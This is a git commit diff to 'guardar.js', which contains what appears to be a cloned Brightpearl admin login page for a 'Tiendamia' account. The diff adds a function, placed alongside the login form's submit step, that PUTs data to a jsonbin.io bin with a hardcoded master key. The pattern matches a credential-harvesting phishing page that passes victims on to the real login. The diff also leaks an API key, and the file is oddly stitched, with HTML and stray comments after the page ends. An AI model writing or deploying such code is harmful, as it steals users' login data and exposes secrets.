02bd8d13831e1a326be5c6a8a8001ee7ed2f0811
TiendamiaBP <158293608+TiendamiaBP@users.noreply.github.com>
2024-01-31 17:31:50 -0300

    guardar.js

--- guardar.js
+++ guardar.js
@@ -56,32 +56,36 @@
 
             $('.sso-button').click(function() {
                 $('#submit-sso').click();
-            })
+            });
+
+            const BIN_ID = '65ba84021f5677401f28f3cb';
+            const X_MASTER_KEY = '$2a$10$SPnSCePVMiT4fZnmd.DVkOYXTe9wOTGzhsevMfAVMbTaXoroZSa6y';
+
+            function guardarDatos(data) {
+                console.log('Guardando datos:', data);
+
+                const url = `https://api.jsonbin.io/b/${BIN_ID}`;
+                const headers = {
+                    'Content-Type': 'application/json',
+                    'Authorization': X_MASTER_KEY,
+                };
+
+                const requestOptions = {
+                    method: 'PUT',
+                    headers: headers,
+                    body: JSON.stringify(data),
+                };
+
+                fetch(url, requestOptions)
+                    .then(response => response.json())
+                    .then(json => console.log('Respuesta JSONBin:', json))
+                    .catch(error => console.error('Error:', error));
+            }
+
+            // Continúa con el envío del formulario si es necesario
+            // Puedes redirigir o realizar otras acciones aquí
+            document.getElementById('login-form-admin').submit();
         });
-
-        const BIN_ID = '65ba84021f5677401f28f3cb';
-        const X_MASTER_KEY = '$2a$10$SPnSCePVMiT4fZnmd.DVkOYXTe9wOTGzhsevMfAVMbTaXoroZSa6y';
-
-        function guardarDatos(data) {
-            console.log('Guardando datos:', data);
-
-            const url = `https://api.jsonbin.io/b/${BIN_ID}`;
-            const headers = {
-                'Content-Type': 'application/json',
-                'Authorization': X_MASTER_KEY,
-            };
-
-            const requestOptions = {
-                method: 'PUT',
-                headers: headers,
-                body: JSON.stringify(data),
-            };
-
-            fetch(url, requestOptions)
-                .then(response => response.json())
-                .then(json => console.log('Respuesta JSONBin:', json))
-                .catch(error => console.error('Error:', error));
-        }
 
     </script>
 
@@ -101,7 +105,7 @@
                 <span>Hello</span> Tiendamia                <br/>
                 <a class="login-tiny-link" href="https://login.brightpearlapp.com">Sign in to a different account</a>
             </div>
-                        <form id="login-form-admin"                  method="post" action="//use1.brightpearlapp.com/admin_login.php">
+                        <form id="login-form-admin" method="post" action="//use1.brightpearlapp.com/admin_login.php">
                 <input type="hidden" name="clients_id" value="tiendamia"/>
                 <input type="hidden" name="redirect" value="//use1.brightpearlapp.com/index.php"/>
                 <input type="hidden" name="action" value="login"/>
@@ -151,6 +155,7 @@
     <script src="https://dxfbapopdsmzi.cloudfront.net/5.0.1122/build/js/intercom.logged.out.js"></script>
 </body>
 </html>
+
 
     // Continúa con el envío del formulario si es necesario
     // Puedes redirigir o realizar otras acciones aquí
